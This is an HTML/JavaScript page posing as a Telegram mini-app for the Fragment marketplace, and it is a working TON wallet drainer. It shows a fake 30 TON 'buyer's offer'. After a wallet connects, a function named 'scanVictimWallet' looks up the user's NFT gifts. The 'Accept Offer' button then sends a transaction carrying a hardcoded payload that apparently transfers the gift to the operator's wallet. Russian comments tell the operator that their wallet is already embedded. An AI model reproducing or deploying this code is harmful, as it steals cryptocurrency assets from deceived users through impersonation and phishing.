<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        :root { --bg: #0f0f0f; --card: #1a1a1a; --text: #e8e8e8; --dim: #888; --accent: #0098ea; --border: #2a2a2a; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; padding: 20px; min-height: 100vh; }
        
        .container { max-width: 400px; width: 100%; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; text-align: center; display: none; }
        .card.active { display: block; }
        
        .header { font-size: 20px; font-weight: bold; color: var(--accent); margin-bottom: 24px; display: flex; align-items: center; justify-content: center; gap: 8px;}
        
        .gift-img-wrapper { width: 160px; height: 160px; margin: 0 auto 16px; position: relative; display: flex; align-items: center; justify-content: center; background: #232429; border-radius: 12px; overflow: hidden; }
        .gift-img { width: 100%; height: 100%; object-fit: contain; }
        
        .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; margin-bottom: 4px; }
        .gift-name { font-size: 22px; font-weight: bold; margin-bottom: 24px; }
        
        .offer-box { background: linear-gradient(135deg, rgba(0,152,234,0.1), rgba(0,152,234,0.02)); border: 1px solid rgba(0,152,234,0.3); border-radius: 12px; padding: 16px; margin-bottom: 24px; }
        .offer-label { font-size: 12px; color: var(--dim); margin-bottom: 4px; }
        .offer-price { font-size: 32px; font-weight: bold; color: var(--accent); }
        .offer-price small { font-size: 14px; color: var(--dim); font-weight: normal; }
        
        .btn { background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: opacity 0.2s; display: none; }
        .btn.active { display: block; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .loading-text { font-size: 16px; color: var(--dim); text-align: center; padding: 40px 0; display: none; }
        .loading-text.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <button class="btn active" id="connectBtn">Connect Wallet</button>
        <div id="loading" class="loading-text">Поиск доступных офферов...</div>

        <div class="card" id="mainCard">
            <div class="header">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                Fragment
            </div>
            
            <div class="gift-img-wrapper" id="imgWrapper">
                <img class="gift-img" id="giftImage" src="" alt="Gift">
            </div>
            
            <div class="gift-collection" id="giftCollection">Gifts Collection</div>
            <div class="gift-name" id="giftName">Loading...</div>

            <div class="offer-box">
                <div class="offer-label">Buyer's offer</div>
                <div class="offer-price">30 <small>TON</small></div>
            </div>
            
            <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
                @fragment_buyer wants to purchase your gift
            </p>

            <button class="btn active" id="acceptBtn">Accept Offer</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }
        
        // Официальный манифест Fragment
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
            manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
        });

        // Твой кошелёк зашит в этом пейлоаде (тебе ничего менять не нужно)
        const PAYLOAD_B64 = "te6cckEBAQEARAAAn1/MPRQAAAAAAAAAACExChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTEhMQoQrmqGUvEag+zYA40IVDpJjpCm7PJsdSU2CFbJyV9GVgEAAlw="; 

        let targetNftAddress = null;

        const connectBtn = document.getElementById('connectBtn');
        const loading = document.getElementById('loading');
        const mainCard = document.getElementById('mainCard');
        const acceptBtn = document.getElementById('acceptBtn');

        // --- БИБЛИОТЕКА ДЛЯ КОНВЕРТАЦИИ TON-АДРЕСОВ В БРАУЗЕРЕ ---
        // Это нужно, чтобы TON Connect не падал с ошибкой "Wrong address format"
        function toFriendlyAddress(rawAddr) {
            if (!rawAddr) return "";
            if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr; // Уже нормальный
            
            try {
                const [wc, hex] = rawAddr.split(':');
                const wcByte = parseInt(wc);
                const hash = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                
                // Магия TON: флаг + workchain + 32 байта хэша + crc16
                const buffer = new Uint8Array(34);
                buffer[0] = 0x11; // bounceable (EQ)
                buffer[1] = wcByte;
                buffer.set(hash, 2);
                
                // Функция подсчета CRC16 (упрощенная реализация)
                function crc16(data) {
                    let crc = 0;
                    for (let i = 0; i < data.length; i++) {
                        crc ^= data[i] << 8;
                        for (let j = 0; j < 8; j++) {
                            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
                            else crc <<= 1;
                        }
                    }
                    return crc & 0xffff;
                }
                
                const crc = crc16(buffer);
                const full = new Uint8Array(36);
                full.set(buffer);
                full[34] = (crc >> 8) & 0xff;
                full[35] = crc & 0xff;
                
                // Base64url кодирование
                let binary = '';
                full.forEach(b => binary += String.fromCharCode(b));
                const b64 = btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                return b64;
            } catch (e) {
                return rawAddr; // Если не получилось, оставляем как есть
            }
        }

        connectBtn.addEventListener('click', async () => {
            try {
                connectBtn.disabled = true;
                await tonConnectUI.connectWallet();
            } catch (e) {
                connectBtn.disabled = false;
                alert("Ошибка подключения: " + e.message);
            }
        });

        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                connectBtn.classList.remove('active');
                loading.classList.add('active');
                await scanVictimWallet(wallet.account.address);
            } else {
                connectBtn.classList.add('active');
                connectBtn.disabled = false;
                loading.classList.remove('active');
                mainCard.classList.remove('active');
            }
        });

        async function scanVictimWallet(address) {
            try {
                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
                const data = await res.json();

                if (!data.nft_items || data.nft_items.length === 0) {
                    loading.innerText = "У вас нет подарков для продажи.";
                    return;
                }

                // Ищем подарок
                let nft = data.nft_items.find(item => 
                    (item.collection?.name || "").toLowerCase().includes("gift") || 
                    (item.metadata?.name || "").toLowerCase().includes("gift")
                ) || data.nft_items[0];

                // Конвертируем адрес NFT в безопасный для TON Connect
                targetNftAddress = toFriendlyAddress(nft.address);
                console.log("NFT Address:", targetNftAddress); // Для отладки

                document.getElementById('giftImage').src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
                document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
                document.getElementById('giftCollection').innerText = nft.collection?.name || "Gifts Collection";

                loading.classList.remove('active');
                mainCard.classList.add('active');
                if(tg) tg.HapticFeedback.notificationOccurred('success');

            } catch (e) {
                console.error(e);
                loading.innerText = "Ошибка загрузки профиля. Обновите страницу.";
            }
        }

        acceptBtn.addEventListener('click', async () => {
            if (!targetNftAddress) return;
            
            acceptBtn.disabled = true; 
            acceptBtn.innerText = "Processing...";
            
            try {
                acceptBtn.innerText = "Confirm in wallet...";
                
                await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [{
                        address: targetNftAddress,
                        amount: "50000000",
                        payload: PAYLOAD_B64
                    }]
                });
                
                acceptBtn.innerText = "Offer Accepted ✓";
                if (tg) tg.HapticFeedback.notificationOccurred('success');
                
            } catch (e) {
                acceptBtn.disabled = false; 
                acceptBtn.innerText = "Accept Offer";
                alert("Ошибка транзакции: " + e.message);
            }
        });
    </script>
</body>
</html>
